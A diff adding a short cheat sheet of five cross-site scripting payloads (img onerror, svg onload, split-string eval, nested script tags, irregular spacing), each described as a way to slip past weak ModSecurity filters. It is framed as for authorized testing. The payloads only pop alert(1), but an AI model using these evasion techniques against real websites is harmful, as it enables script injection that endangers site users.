@@ -1,0 +1,44 @@
+# ModSecurity WAF Bypass Payloads (Basic Techniques)
+
+Note:
+WAF bypass techniques depend heavily on configuration.
+Modern ModSecurity rule sets may block these payloads.
+
+# Purpose:
+# Demonstrates common techniques that may bypass weak or misconfigured
+# ModSecurity rules.
+
+⚠️ For educational and authorized testing only.
+⚠️ Effectiveness depends on rule set and configuration.
+
+----------------------------------------
+1. Image Error Event
+Payload: <img src=x onerror=alert(1)>
+Description: Uses event handler instead of <script>.
+Use Case: When script tags are blocked.
+
+----------------------------------------
+2. SVG Onload
+Payload: <svg/onload=alert(1)>
+Description: Executes inside SVG context.
+Use Case: Bypass filters ignoring SVG.
+
+----------------------------------------
+3. Obfuscated eval
+Payload: <script>eval('al'+'ert(1)')</script>
+Description: Splits keyword to avoid detection.
+Use Case: Bypass keyword-based filtering.
+
+----------------------------------------
+4. Nested Tag Injection
+Payload: <scr<script>ipt>alert(1)</script>
+Description: Breaks keyword into nested tags.
+Use Case: Bypass pattern-based filters.
+
+----------------------------------------
+5. Non-Standard Spacing
+Payload: <img src = x onerror = alert(1)>
+Description: Adds irregular spacing.
+Use Case: Bypass strict pattern matching rules.
+
+----------------------------------------
